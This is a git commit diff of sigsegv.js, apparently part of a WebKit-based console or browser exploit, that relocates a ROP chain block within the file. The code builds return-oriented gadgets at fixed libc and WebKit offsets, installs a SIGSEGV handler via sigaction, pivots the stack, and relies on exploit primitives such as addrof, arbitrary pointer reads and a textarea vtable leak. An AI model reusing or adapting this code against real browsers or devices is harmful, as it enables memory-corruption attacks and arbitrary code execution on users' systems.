19470b693a3938e3c49724adb45428d4e67abe6f
Mugiwara <37186888+ciss84@users.noreply.github.com>
2023-10-09 12:37:49 +0200

    Add files via upload

--- sigsegv.js
+++ sigsegv.js
@@ -1,48 +1,3 @@
-var ropchain_array = new Uint32Array(62);
-var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
-var ropchain_offset = 2;
-function set_gadget(val)
-{
-    ropchain_array[ropchain_offset++] = val | 0;
-    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
-}
-function set_gadgets(l)
-{
-    for(var i = 0; i < l.length; i++)
-        set_gadget(l[i]);
-}
-function db(data)
-{
-    for(var i = 0; i < data.length; i++)
-        ropchain_array[ropchain_offset++] = data[i];
-}
-set_gadgets([
-libc_base+289418, //pop rcx
-ropchain+96, //rdi_stash
-libc_base+106202, //mov [rcx], rdi
-libc_base+276082 //pop rdi
-]);
-db([11, 0]); // 0xb
-set_gadgets([
-libc_base+77390, //pop rsi
-ropchain+112, //sigaction
-webkit_base+87786 //pop rdx
-]);
-db([0, 0]); // 0x0
-set_gadgets([
-sigaction_addr,
-libc_base+276082 //pop rdi
-]);
-//rdi_stash:
-db([0, 0]); // 0x0
-set_gadgets([
-pivot_addr,
-//sigaction:
-sigsegv_handler
-]);
-ropchain_offset += 32;
-pivot(ropchain);
-
 var malloc_nogc = [];
 function malloc(sz)
 {
@@ -50,6 +5,7 @@ function malloc(sz)
     malloc_nogc.push(arr);
     return read_ptr_at(addrof(arr)+0x10);
 }
+
 var tarea = document.createElement('textarea');
 var vt_ptr = read_ptr_at(addrof(tarea)+0x18);
 var vtable = read_ptr_at(vt_ptr);
@@ -148,6 +104,52 @@ function pivot_cb(buf, callback)
     };
     wait();
 }
+
+var ropchain_array = new Uint32Array(62);
+var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
+var ropchain_offset = 2;
+function set_gadget(val)
+{
+    ropchain_array[ropchain_offset++] = val | 0;
+    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
+}
+function set_gadgets(l)
+{
+    for(var i = 0; i < l.length; i++)
+        set_gadget(l[i]);
+}
+function db(data)
+{
+    for(var i = 0; i < data.length; i++)
+        ropchain_array[ropchain_offset++] = data[i];
+}
+set_gadgets([
+libc_base+289418, //pop rcx
+ropchain+96, //rdi_stash
+libc_base+106202, //mov [rcx], rdi
+libc_base+276082 //pop rdi
+]);
+db([11, 0]); // 0xb
+set_gadgets([
+libc_base+77390, //pop rsi
+ropchain+112, //sigaction
+webkit_base+87786 //pop rdx
+]);
+db([0, 0]); // 0x0
+set_gadgets([
+sigaction_addr,
+libc_base+276082 //pop rdi
+]);
+//rdi_stash:
+db([0, 0]); // 0x0
+set_gadgets([
+pivot_addr,
+//sigaction:
+sigsegv_handler
+]);
+ropchain_offset += 32;
+pivot(ropchain);
+
 var sys_613_addr = libkernel_base + 0x32ad0;
 var sys_138_addr = libkernel_base + 0x32af0;
 var sys_481_addr = libkernel_base + 0x32b10;
